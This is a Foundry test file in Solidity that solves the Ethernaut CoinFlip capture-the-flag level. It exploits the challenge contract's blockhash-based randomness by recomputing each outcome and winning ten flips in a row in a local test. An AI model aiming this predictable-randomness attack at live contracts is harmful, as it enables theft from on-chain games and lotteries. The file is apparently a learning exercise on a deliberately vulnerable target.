// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "ethernaut/03CoinFlip.sol";

contract TestCoinFlip is Test {
    CoinFlip public coinFlipContract;

    // CoinFlip public coinFlipAttacker;

    function setUp() public {
        coinFlipContract = new CoinFlip();
        // coinFlipAttacker = new CoinFlip();
    }

    function test_attack() public {
        console.log(
            "coinFlip.consecutiveWins()",
            coinFlipContract.consecutiveWins()
        );

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;

            bool side = coinFlip == 1 ? true : false;
            coinFlipContract.flip(side);
        }

        console.log(
            "coinFlip.consecutiveWins()",
            coinFlipContract.consecutiveWins()
        );
    }
}
